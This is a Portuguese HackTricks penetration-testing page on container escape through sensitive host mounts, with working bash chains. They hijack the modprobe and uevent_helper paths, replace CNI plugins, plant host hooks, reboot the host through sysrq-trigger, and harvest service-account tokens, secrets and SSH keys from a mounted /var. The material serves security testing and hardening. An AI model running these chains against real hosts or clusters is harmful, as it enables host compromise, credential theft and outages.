# Montagens Sensíveis do Host

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

As montagens do host são uma das superfícies práticas mais importantes para container escape, pois frequentemente desfazem uma visão de processos cuidadosamente isolada, restaurando a visibilidade direta dos recursos do host. Os casos perigosos não se limitam a `/`. Bind mounts de `/proc`, `/sys`, `/var`, sockets de runtime, estado gerenciado pelo kubelet ou caminhos relacionados a dispositivos podem expor controles do kernel, credenciais, filesystems de containers vizinhos e interfaces de gerenciamento do runtime.

Esta página existe separadamente das páginas de proteção individuais porque o modelo de abuso é transversal. Uma montagem do host com permissão de escrita é perigosa em parte por causa dos mount namespaces, em parte por causa dos user namespaces, em parte por causa da cobertura do AppArmor ou SELinux e em parte por causa do caminho exato do host que foi exposto. Tratar isso como um tópico próprio torna a superfície de ataque muito mais fácil de analisar.

## Exposição de `/proc`

O procfs contém tanto informações comuns de processos quanto interfaces de controle do kernel de alto impacto. Portanto, um bind mount como `-v /proc:/host/proc` ou uma visão do container que exponha entradas de proc inesperadamente graváveis pode levar à divulgação de informações, negação de serviço ou execução direta de código no host.

Os caminhos de alto valor do procfs incluem:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (especialmente `register` e `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Comece verificando quais entradas de alto valor do procfs estão visíveis ou podem ser gravadas:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Esses caminhos são interessantes por razões diferentes. `core_pattern`, `modprobe` e `binfmt_misc` podem se tornar caminhos de execução de código no host quando são graváveis. `kallsyms`, `kmsg`, `kcore` e `config.gz` são fontes poderosas de reconnaissance para exploração do kernel. `sched_debug` e `mountinfo` revelam o contexto de processos, cgroups e sistemas de arquivos, o que pode ajudar a reconstruir o layout do host de dentro do container.

O valor prático de cada caminho é diferente, e tratar todos como se tivessem o mesmo impacto dificulta a triagem:

- `/proc/sys/kernel/core_pattern`
Se for gravável, este é um dos caminhos procfs de maior impacto, pois o kernel executará um pipe handler após uma falha. Um container que possa apontar `core_pattern` para um payload armazenado em seu overlay ou em um caminho do host montado geralmente consegue obter execução de código no host. Consulte também [read-only-paths.md](protections/read-only-paths.md) para ver um exemplo dedicado.
- `/proc/sys/kernel/modprobe`
Este caminho controla o helper de userspace usado pelo kernel quando precisa invocar a lógica de carregamento de módulos. Se for gravável a partir do container e interpretado no contexto do host, pode se tornar outra primitive de execução de código no host. É especialmente interessante quando combinado com uma forma de acionar o caminho do helper.
- `/proc/sys/vm/panic_on_oom`
Normalmente, isso não é uma primitive de escape limpa, mas pode transformar pressão de memória em denial of service em todo o host, convertendo condições de OOM em comportamento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se a interface de registro for gravável, o atacante poderá registrar um handler para um valor magic escolhido e obter execução no contexto do host quando um arquivo correspondente for executado.
- `/proc/config.gz`
Útil para a triagem de exploits do kernel. Ajuda a determinar quais subsistemas, mitigações e recursos opcionais do kernel estão habilitados sem precisar dos metadados de pacotes do host.
- `/proc/sysrq-trigger`
Principalmente um caminho de denial of service, mas muito sério. Pode reiniciar, causar panic ou interromper o host imediatamente de outras formas.
- `/proc/kmsg`
Revela mensagens do ring buffer do kernel. É útil para fingerprinting do host, análise de crashes e, em alguns ambientes, para leak de informações úteis à exploração do kernel.
- `/proc/kallsyms`
É valioso quando legível, pois expõe informações sobre símbolos exportados do kernel e pode ajudar a contornar premissas de randomização de endereços durante o desenvolvimento de exploits do kernel.
- `/proc/[pid]/mem`
Esta é uma interface direta para a memória de processos. Se o processo-alvo puder ser alcançado com as condições necessárias semelhantes às do ptrace, isso poderá permitir ler ou modificar a memória de outro processo. O impacto real depende bastante de credenciais, `hidepid`, Yama e restrições de ptrace, portanto este é um caminho poderoso, mas condicional.
- `/proc/kcore`
Expõe uma visão da memória do sistema no estilo de uma imagem de core. O arquivo é enorme e difícil de usar, mas, se for significativamente legível, indica uma superfície de memória do host gravemente exposta.
- `/dev/kmem` e `/dev/mem`
Estas são interfaces históricas de **device** para acesso à memória bruta e não arquivos procfs. Em muitos sistemas modernos, estão ausentes ou fortemente restritas, mas um container que possa abrir uma cópia montada do host deve tratar essa exposição como crítica. Analise-as junto com outros mounts sensíveis de `/dev`, em vez de procurar os caminhos inexistentes `/proc/kmem` ou `/proc/mem`.
- `/proc/sched_debug`
Faz leak de informações de agendamento e tarefas que podem expor identidades de processos do host, mesmo quando outras visões de processos parecem mais limpas do que o esperado.
- `/proc/[pid]/mountinfo`
É extremamente útil para reconstruir onde o container realmente está localizado no host, quais caminhos são respaldados por overlay e se um mount gravável corresponde a conteúdo do host ou apenas à camada do container.

Se `/proc/[pid]/mountinfo` ou os detalhes do overlay estiverem legíveis, use-os para recuperar o caminho do host correspondente ao filesystem do container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Esses comandos são úteis porque várias técnicas de execução no host exigem transformar um caminho dentro do container no caminho correspondente sob a perspectiva do host.

### Exemplo: Preparando um Caminho Auxiliar `modprobe`

Se `/proc/sys/kernel/modprobe` puder ser gravado a partir do container e o caminho do auxiliar for interpretado no contexto do host, ele poderá ser redirecionado para um payload controlado pelo atacante. O diretório superior do overlay deve ser resolvido a partir do host, e a saída de prova deve ser gravada novamente nessa mesma camada do container visível pelo host caso o container também não monte o `/tmp` do host:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
O gatilho exato depende do alvo e do comportamento do kernel e não é deliberadamente presumido. Restaure o valor original antes de sair do lab. O ponto importante é que um caminho auxiliar com permissão de escrita pode redirecionar uma futura invocação de helper do kernel para conteúdo de um caminho do host controlado pelo atacante. Um `upperdir` ausente, um caminho que o host não consegue resolver, uma montagem sysctl somente leitura ou um kernel que nunca invoca o helper selecionado interrompem essa cadeia.

### Exemplo completo: Recon do kernel com `kallsyms`, `kmsg` e `config.gz`

Se o objetivo for avaliar a explorabilidade em vez de obter uma fuga imediata:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Esses comandos ajudam a responder se informações úteis de símbolos estão visíveis, se mensagens recentes do kernel revelam um estado interessante e quais recursos ou mitigações do kernel estão compilados. O impacto geralmente não é um escape direto, mas isso pode reduzir drasticamente o tempo de triagem de vulnerabilidades do kernel.

### Exemplo completo: Reboot do host via SysRq

Se `/proc/sysrq-trigger` for gravável e alcançar a visão do host:
```bash
echo b > /proc/sysrq-trigger
```
O efeito é uma reinicialização imediata do host. Este não é um exemplo sutil, mas demonstra claramente que a exposição do procfs pode ser muito mais séria do que a divulgação de informações.

## Exposição de `/sys`

O sysfs expõe grandes quantidades de estado do kernel e dos dispositivos. Alguns caminhos do sysfs são principalmente úteis para fingerprinting, enquanto outros podem afetar a execução de helpers, o comportamento dos dispositivos, a configuração de módulos de segurança ou o estado do firmware.

Caminhos do sysfs de alto valor incluem:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Esses caminhos são importantes por motivos diferentes. `/sys/class/thermal` pode influenciar o comportamento do gerenciamento térmico e, portanto, a estabilidade do host em ambientes expostos de forma inadequada. `/sys/kernel/vmcoreinfo` pode causar leak de informações sobre crash dumps e o layout do kernel, ajudando no fingerprinting de baixo nível do host. `/sys/kernel/security` é a interface `securityfs` usada pelos Linux Security Modules, portanto, o acesso inesperado a ela pode expor ou alterar o estado relacionado a MAC. Os caminhos de variáveis EFI podem afetar configurações de boot armazenadas no firmware, tornando-os muito mais sérios do que arquivos de configuração comuns. O `debugfs` em `/sys/kernel/debug` é especialmente perigoso porque é intencionalmente uma interface voltada para desenvolvedores, com muito menos expectativas de segurança do que APIs do kernel reforçadas e voltadas à produção.

Cada entrada do sysfs nesta lista depende do **kernel, da configuração e do hardware**. Os nós virtualizados atuais normalmente omitem `uevent_helper`, as variáveis EFI e as entradas de dispositivos térmicos. Registre um caminho ausente como um pré-requisito negativo, em vez de presumir que um exemplo de outro kernel se aplica.

Comandos úteis de revisão para esses caminhos são:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
O que torna esses comandos interessantes:

- `/sys/kernel/security` pode revelar se AppArmor, SELinux ou outra superfície LSM está visível de uma forma que deveria ter permanecido exclusiva do host.
- `/sys/kernel/debug` costuma ser a descoberta mais alarmante deste grupo. Se `debugfs` estiver montado e puder ser lido ou escrito, espere uma ampla superfície voltada ao kernel, cujo risco exato depende dos nós de debug habilitados.
- A exposição de variáveis EFI é menos comum, mas tem alto impacto quando presente, pois afeta configurações armazenadas no firmware, em vez de arquivos comuns de runtime.
- `/sys/class/thermal` é principalmente relevante para a estabilidade do host e a interação com o hardware, não para um escape organizado no estilo de shell.
- `/sys/kernel/vmcoreinfo` é principalmente uma fonte de fingerprinting do host e de análise de falhas, útil para entender o estado de baixo nível do kernel.

### Exemplo completo: `uevent_helper`

`/sys/kernel/uevent_helper` depende do kernel e da configuração e está ausente em muitos sistemas atuais. Se existir, puder ser escrito e houver um trigger `uevent` utilizável, o kernel poderá executar um helper controlado pelo atacante. A saída de prova deve usar um caminho visível tanto na visão do host quanto na do container:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
O motivo pelo qual isso funciona é que o caminho do helper é interpretado a partir do ponto de vista do host. Quando acionado, o helper é executado no contexto do host, em vez de dentro do container atual. `/sys/class/mem/null/uevent` é um trigger concreto em kernels que o expõem; outros dispositivos podem expor seus próprios arquivos `uevent`, mas não selecione um deles cegamente em hardware real. Restaure o valor original antes de sair do laboratório. Não relate esta técnica como disponível quando o arquivo do helper ou um trigger controlado estiver ausente.

## Exposição de `/var`

Montar o `/var` do host em um container costuma ser subestimado porque não parece tão dramático quanto montar o `/`. Na prática, isso pode ser suficiente para alcançar sockets de runtime, diretórios de snapshots de containers, volumes de pods gerenciados pelo kubelet, tokens de service account projetados e sistemas de arquivos de aplicações vizinhas. Em nodes modernos, `/var` geralmente é onde realmente reside o estado de containers mais interessante do ponto de vista operacional.

### Exemplo de Kubernetes

Um pod com `hostPath: /var` pode frequentemente ler tokens projetados de outros pods e o conteúdo de snapshots overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Esses comandos são úteis porque respondem se o mount expõe apenas dados de aplicação sem interesse ou credenciais de alto impacto do cluster. Um token de service-account legível pode transformar imediatamente a execução local de código em acesso à Kubernetes API.

Se o token estiver presente, valide o que ele pode acessar em vez de parar na descoberta do token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
O impacto aqui pode ser muito maior do que o acesso ao node local. Um token com RBAC amplo pode transformar um `/var` montado em um comprometimento de todo o cluster.

### Exemplo de Docker e containerd

Em hosts Docker, os dados relevantes geralmente ficam em `/var/lib/docker`, enquanto em nodes Kubernetes baseados em containerd eles podem estar em `/var/lib/containerd` ou em paths específicos do snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se o `/var` montado expuser o conteúdo gravável de um snapshot de outra carga de trabalho, o atacante poderá alterar arquivos da aplicação, inserir conteúdo web ou modificar scripts de inicialização sem tocar na configuração do container atual.

Em uma **carga de trabalho de laboratório descartável**, o conteúdo gravável do snapshot pode demonstrar adulteração da aplicação, recuperação de secrets ou movimentação lateral. Primeiro, associe o ID do container em execução ao snapshot exato e nunca edite um snapshot não relacionado ou de produção:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Esses comandos são úteis porque mostram as três principais famílias de impacto de um `/var` montado: adulteração de aplicações, recuperação de secrets e lateral movement para workloads vizinhos.

Gravações diretas em snapshots ignoram o gerenciamento normal de estado do runtime e podem corromper o container ou destruir evidências. A descoberta somente leitura foi reproduzida localmente no Docker `overlay2`: um marcador gravado em um container descartável vizinho apareceu abaixo de `/var/lib/docker/overlay2/<id>/diff/`. Limite a modificação real de snapshots a um container descartável criado para esse teste.

## Estado do Kubelet, Plugins e caminhos do CNI

Uma montagem de `/var/lib/kubelet`, `/opt/cni/bin` ou `/etc/cni/net.d` é frequentemente exposta por DaemonSets privilegiados, agentes CNI, plugins de nó CSI, operadores de GPU e auxiliares de armazenamento. Essas montagens são fáceis de considerar como "infraestrutura do node", mas ficam diretamente no caminho de execução de novos pods e geralmente contêm credenciais do kubelet, secrets projetados, sockets de registro e binários executáveis de plugins no host.

Os alvos de alto valor incluem:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Comandos úteis para revisão:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Por que esses paths são importantes:

- `/var/lib/kubelet/pki` pode expor certificados de cliente do kubelet e outras credenciais locais do node que, às vezes, podem ser reutilizadas contra o API server ou endpoints TLS voltados ao kubelet, dependendo do design do cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` geralmente contém tokens de service-account projetados e Secrets montados para pods vizinhos no mesmo node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` é principalmente uma superfície de reconhecimento, mas muito útil: revela quais pods e containers possuem atualmente GPUs, hugepages, dispositivos SR-IOV e outros recursos escassos locais do node.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` revelam quais plugins CSI, DRA e de dispositivos estão instalados e com quais sockets o kubelet deve se comunicar. Se esses diretórios forem graváveis, em vez de apenas legíveis, o finding se torna muito mais sério.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` e `/etc/cni/net.d` ficam diretamente no caminho de configuração da rede dos pods. O acesso gravável nesses locais costuma ser uma primitive de execução atrasada no host, e não apenas uma exposição de configuração.<sup>[[2]](#references)</sup>

### Exemplo completo: `/opt/cni/bin` gravável

Se um diretório de binários CNI do host estiver montado com acesso de leitura e escrita, substituir um plugin pode ser suficiente para obter execução no host na próxima vez que o kubelet criar um pod sandbox nesse node:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Isso não é tão imediato quanto um `docker.sock` montado, mas costuma ser mais realista em infrastructure pods do Kubernetes comprometidos. O marker é gravado ao lado do plugin montado para que o container possa recuperá-lo mesmo sem um mount de host-root ou de host-`/tmp`. O wrapper preserva os argumentos originais e a entrada padrão; em seguida, o exemplo restaura o binário original. O ponto importante é que o binário modificado é executado posteriormente pelo fluxo de configuração da rede do host, e não pelo container atual. Use apenas um node descartável, pois um wrapper inválido pode impedir que novos sandboxes de Pod recebam conectividade de rede.

## Sockets de Runtime

Mounts sensíveis do host geralmente incluem sockets de runtime em vez de diretórios completos. Eles são tão importantes que merecem ser repetidos explicitamente aqui:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consulte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para ver os fluxos completos de exploração quando um desses sockets é montado.

Como um padrão rápido para a primeira interação:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se um desses for bem-sucedido, o caminho de "socket montado" até "iniciar um container sibling com mais privilégios" geralmente é muito mais curto do que qualquer caminho de breakout do kernel.

## Hijacking de Tarefas por Meio de Caminhos do Host com Permissão de Escrita

Um mount do host com permissão de escrita não precisa expor `/` para ser perigoso. Se o caminho montado contiver scripts, arquivos de configuração, hooks, plugins ou arquivos consumidos posteriormente por uma tarefa agendada ou serviço executado no host, o container poderá alterar o que o host executa.

Fluxo genérico de revisão:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Se um arquivo gravável for consumido por um processo do host, mantenha o payload simples e observável durante os testes:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
A parte interessante é o trust boundary: a gravação acontece de dentro do container, mas a execução ocorre posteriormente no contexto do serviço do host. Isso transforma um hostPath ou bind mount restrito em uma primitiva de execução de código no host atrasada.

## CVEs relacionadas a mounts

Os mounts do host também podem interagir com vulnerabilidades do runtime. Exemplos recentes importantes incluem:

- `CVE-2024-21626` no `runc`, em que um file descriptor de diretório vazado poderia posicionar o diretório de trabalho no filesystem do host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` no BuildKit, em que Dockerfiles, frontends e fluxos `RUN --mount` maliciosos poderiam reintroduzir acesso, exclusão ou privilégios elevados a arquivos do host durante os builds.
- `CVE-2024-1753` nos fluxos de build do Buildah e Podman, em que bind mounts criados de forma maliciosa durante o build poderiam expor `/` com permissões de leitura e escrita.
- `CVE-2025-47290` no `containerd` 2.1.0, em que uma condição TOCTOU durante o unpack de uma imagem poderia permitir que uma imagem especialmente criada modificasse o filesystem do host durante o pull.

Essas CVEs são relevantes aqui porque mostram que o tratamento de mounts não depende apenas da configuração do operador. O próprio runtime também pode introduzir condições de escape orientadas por mounts.

## Verificações

Use estes comandos para localizar rapidamente as exposições de mounts de maior valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
O que é interessante aqui:

- A raiz do host, `/proc`, `/sys`, `/var` e os runtime sockets são todos findings de alta prioridade.
- Entradas de proc/sys com permissão de escrita geralmente significam que o mount está expondo controles globais do kernel do host, em vez de uma visão segura do container.
- Caminhos montados de `/var` merecem uma análise de credenciais e workloads vizinhos, não apenas uma análise do filesystem.
- Diretórios de estado do Kubelet e caminhos de CNI/plugin merecem a mesma prioridade que os runtime sockets, pois frequentemente ficam diretamente no caminho de criação de pods e distribuição de credenciais do node.

## Status da Validação Local

As cadeias práticas nesta página foram verificadas em um node Linux minikube local. A validação reproduziu:

- acesso de leitura e escrita por meio de um hostPath temporário com permissão de escrita
- descoberta de tokens de ServiceAccount projetados e Secrets montados por meio de `/var/lib/kubelet/pods`
- autenticação bem-sucedida na Kubernetes API com um token ativo recuperado desse estado montado do kubelet
- descoberta somente leitura de um filesystem `overlay2` vizinho do Docker por meio de `/var` montado
- criação, pela Docker API, de um container irmão com um host bind somente leitura por meio de um `docker.sock` montado
- execução atrasada no host por meio de um hook temporário consumido pelo host
- uma simulação de CNI-wrapper que preservou os argumentos, a entrada padrão e a execução do plugin original

O mesmo node expôs `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` e `config.gz`, mas não expôs `uevent_helper`, variáveis EFI, entradas térmicas ou `sched_debug`. Triggers destrutivos do kernel não foram executados. Isso confirma que as cadeias envolvendo a raiz do host, `/var`, estado do kubelet, sockets e consumidores do host são reproduzíveis, enquanto as técnicas auxiliares de procfs/sysfs devem permanecer condicionais ao kernel exato, ao modo de mount, ao caminho do payload e ao trigger.

## References

- [1] [Arquivos e caminhos locais usados pelo Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [O container cilium-agent pode acessar o host por meio de um mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
